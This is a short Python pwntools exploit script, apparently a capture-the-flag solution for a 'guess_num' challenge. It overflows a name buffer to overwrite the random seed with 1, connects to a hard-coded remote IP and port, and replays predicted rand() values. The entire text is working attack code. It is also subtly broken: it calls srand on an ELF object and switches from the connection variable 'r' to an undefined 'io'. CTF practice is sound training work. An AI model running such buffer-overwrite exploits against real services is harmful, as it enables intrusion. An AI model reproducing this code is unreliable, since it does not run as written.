from pwn import *
from ctypes import *

elf = ELF('/Users/optimus/CTF/PWN/guess_num')
# print elf.got
libc = elf.libc
libc.srand(1)

# libc = cdll.LoadLibrary('/Users/optimus/CTF/PWN/libc-2.29.so')
libc.srand(1)
payload = 'A' * 0x20 + p64(1)
r = remote('111.198.29.45', 40400)
r.recvuntil('name:')
r.sendline(payload)
for i in range(10):
    num = str(libc.rand() % 6 + 1)
    io.recvuntil('number:')
    io.sendline(num)

io.interactive()
